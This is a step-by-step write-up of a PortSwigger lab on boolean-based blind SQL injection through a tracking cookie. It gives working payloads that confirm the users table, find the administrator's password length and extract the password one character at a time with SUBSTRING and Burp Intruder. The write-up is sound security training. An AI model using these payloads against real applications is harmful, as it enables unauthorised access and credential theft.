# 🎯 Blind SQL Injection: Conditional Responses

**Write-Up by Aditya Bhatt | Blind SQLi | Boolean-Based Extraction | BurpSuite**

This PortSwigger lab uses a **tracking cookie** in a backend SQL query.
The response never exposes database output — instead, it shows a **Welcome back** message *only when the SQL condition is true*.
We exploit this boolean behaviour to extract the **administrator’s password, character by character**, and finally log in.

![Cover](Blind_SQLi/Cover.jpeg)

---

# 🧪 TL;DR

* Blind SQLi via **TrackingId** cookie
* Presence of **Welcome back** = TRUE
* Absence = FALSE
* Determine:

  * If table exists
  * If admin exists
  * Password length
  * Password characters (a-z0-9)
* Final Password → Log in → **Lab Solved**

---

# 🌐 Brief Intro

Unlike UNION-based SQLi, here we **cannot see query results**.
But we *can* detect boolean conditions by checking if **Welcome back** appears.

Using this truth leak, we:

1. Verify injection
2. Confirm table and admin user
3. Binary-check password length
4. Bruteforce each character using SUBSTRING
5. Reconstruct the entire password
6. Log in as administrator

Let’s break it down with screenshots.

---

# 🧬 Step-By-Step PoC (Screenshots Included)

---

## **1. Open the Lab and Select a Filter like Pets**

Captured the request to identify cookies.

![1](Blind_SQLi/1.png)

➤ **Why?**
We want the baseline request containing the **TrackingId** parameter.

---

## **2. Send the Request to Repeater (Ctrl + R)**

Repeater helps us manipulate the cookie.

![2](Blind_SQLi/2.png)

➤ **Why?**
All further logic testing is done in Repeater.

---

## **3. Analyze the Request Structure**

Here’s the real request we're testing:

![3](Blind_SQLi/3.png)

➤ **Why?**
Injection point = **TrackingId=...**

---

## **4. Test Boolean TRUE Condition**

Add:

' AND '1'='1

![4](Blind_SQLi/4.png)

➤ **Why?**
Presence of **Welcome back** confirms Boolean TRUE.

---

## **5. Test Boolean FALSE Condition**

Payload:

' AND '1'='2

![5](Blind_SQLi/5.png)

➤ **Why?**
No Welcome back = Boolean FALSE
This establishes True/False measurement for the entire attack.

---

## **6. Verify `users` Table Exists**

Payload:

' AND (SELECT 'a' FROM users LIMIT 1)='a

![6](Blind_SQLi/6.png)

➤ **Why?**
TRUE response confirms table **users** exists.

---

## **7. Verify Administrator User Exists**

Payload:

' AND (SELECT 'a' FROM users WHERE username='administrator')='a

![7](Blind_SQLi/7.png)

➤ **Why?**
TRUE → admin user is present.

---

## **8. Determine Password Length**

Payload:

' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

![8](Blind_SQLi/8.png)

➤ **Why?**
When the condition becomes FALSE → length found.

---

## **9. Intruder Attack to Automate Length Detection**

Sniper → Payload from **1 to 21**.

![9](Blind_SQLi/9.png)

Result:
Welcome back stops at **20** → Password length = **20**

---

## **10. Character Bruteforce Setup (a-z0-9)**

Community users can generate payload list:

![10](Blind_SQLi/10.png)

**Python script you provided:**

```
import os

filename = "payload.txt"

# Create the file if it doesn't exist
if not os.path.exists(filename):
    open(filename, "w").close()

# Write a-z and 0-9 each on a new line
with open(filename, "w") as f:
    # a-z
    for c in range(ord('a'), ord('z') + 1):
        f.write(chr(c) + "\n")
    
    # 0-9
    for n in range(10):
        f.write(str(n) + "\n")

print("payload.txt generated successfully!")
```

➤ **Why?**
This forms the brute-force charset for Intruder.

---

## **11. Extract Character at Position 1**

Payload:

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

![11](Blind_SQLi/11.png)

Character obtained = **6**

---

## **12. Repeat for All Positions (1 → 20)**

Pattern:

' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
…
' AND (SELECT SUBSTRING(password,20,1) FROM users WHERE username='administrator')='a

![12](Blind_SQLi/12.png)

Final password reconstructed:

**611d1j31f4ynt74wibio**

---

## **13. Log In as Administrator**

![13](Blind_SQLi/13.png)

---

## **14. Success — Lab Solved 🎉**

![14](Blind_SQLi/14.png)

---

# 🧠 Key Takeaways

* Blind SQL injection relies entirely on **indirect clues**, not errors.
* Boolean-based attacks require:

  * Reliable TRUE/FALSE reflection
  * Repeater for small checks
  * Intruder for large-value brute force
* SUBSTRING + boolean comparison = full password extraction.

---

# 🔥 Final Thoughts

This lab is the perfect example of how **non-verbose SQLi** can still leak full credentials if boolean conditions are observable. Mastering this technique is crucial for VAPT and real-world pentests where applications hide database errors.

Stay relentless. <br/>
— **Aditya Bhatt** 🔥

---
